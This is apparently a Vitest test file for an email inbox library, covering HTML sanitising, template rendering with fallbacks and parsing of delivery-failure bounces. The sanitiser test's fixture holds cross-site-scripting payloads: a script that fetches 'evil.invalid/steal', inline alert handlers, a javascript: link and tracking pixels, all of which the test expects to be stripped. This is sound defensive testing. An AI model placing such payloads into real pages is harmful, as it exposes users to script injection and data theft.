import { describe, expect, it } from 'vitest';
import {
  activateRemoteImages,
  parseDsnHardBounce,
  renderEmailTemplate,
  sanitizeEmailHtml,
} from '../index.js';

describe('Inbox HTML sanitiser, template renderer & DSN parser (PRD 4.11, 8.3, 9)', () => {
  it('strips active scripts, inline handlers, javascript: URLs and blocks remote images until clicked', () => {
    const raw = `
      <div>
        <p onclick="alert(1)" style="color: #0F1B2A; background: url(https://tracker.invalid/pixel.gif)">Hello Jane,</p>
        <script>fetch('https://evil.invalid/steal')</script>
        <iframe src="https://evil.invalid/frame"></iframe>
        <svg onload="alert(2)"><circle r="10"/></svg>
        <a href="javascript:alert(3)">Unsafe link</a>
        <a href="https://acmetax.example.com/portal">Client portal</a>
        <img src="https://tracker.invalid/open.png" alt="Logo" width="120">
      </div>
    `;
    const res = sanitizeEmailHtml(raw);
    expect(res.hasRemoteImages).toBe(true);
    expect(res.html).not.toContain('<script');
    expect(res.html).not.toContain('<iframe');
    expect(res.html).not.toContain('<svg');
    expect(res.html).not.toContain('onclick');
    expect(res.html).not.toContain('javascript:');
    expect(res.html).not.toContain('url(https://tracker.invalid');
    expect(res.html).not.toContain('src="https://tracker.invalid/open.png"');
    expect(res.html).toContain('data-remote-url="https://tracker.invalid/open.png"');
    expect(res.html).toContain('target="_blank" rel="noopener noreferrer"');

    const activated = activateRemoteImages(res.html);
    expect(activated).toContain(
      'src="https://tracker.invalid/open.png" referrerpolicy="no-referrer"',
    );
  });

  it('renders flat and dotted template variables with fallbacks', () => {
    const subject = renderEmailTemplate(
      '3-day trial for {{company_name|your firm}} — {{contact.first_name|there}}',
      {
        fullName: 'Jane Patel',
        companyName: 'Acme Tax Advisors LLP',
        senderName: 'Arjun Mehta',
      },
    );
    expect(subject).toBe('3-day trial for Acme Tax Advisors LLP — Jane');

    const fallback = renderEmailTemplate('Hi {{first_name|there}} at {{company.name|your firm}}', {
      senderName: 'Arjun Mehta',
    });
    expect(fallback).toBe('Hi there at your firm');
  });

  it('detects DSN 5.x.x hard bounces and ignores regular replies or 4.x.x deferrals', () => {
    const hard = parseDsnHardBounce({
      fromEmail: 'postmaster@outlook.example.com',
      subject: 'Undeliverable: 3-day UltraTax CS trial',
      bodyText: `Delivery has failed to these recipients or groups:\nformer.partner@acmetax.example.com\nDiagnostic information for administrators:\nFinal-Recipient: rfc822;former.partner@acmetax.example.com\nAction: failed\nStatus: 5.1.1`,
    });
    expect(hard).toEqual({
      isHardBounce: true,
      bouncedAddress: 'former.partner@acmetax.example.com',
      statusCode: '5.1.1',
    });

    const soft = parseDsnHardBounce({
      fromEmail: 'postmaster@outlook.example.com',
      subject: 'Delayed: 3-day UltraTax CS trial',
      bodyText: 'Final-Recipient: rfc822;busy@acmetax.example.com\nStatus: 4.4.7',
    });
    expect(soft.isHardBounce).toBe(false);

    const normal = parseDsnHardBounce({
      fromEmail: 'jane.patel@acmetax.example.com',
      subject: 'Re: 3-day UltraTax CS trial',
      bodyText: 'Our tax team uses UltraTax version 5.1.1 for corporate returns.',
    });
    expect(normal.isHardBounce).toBe(false);
  });
});
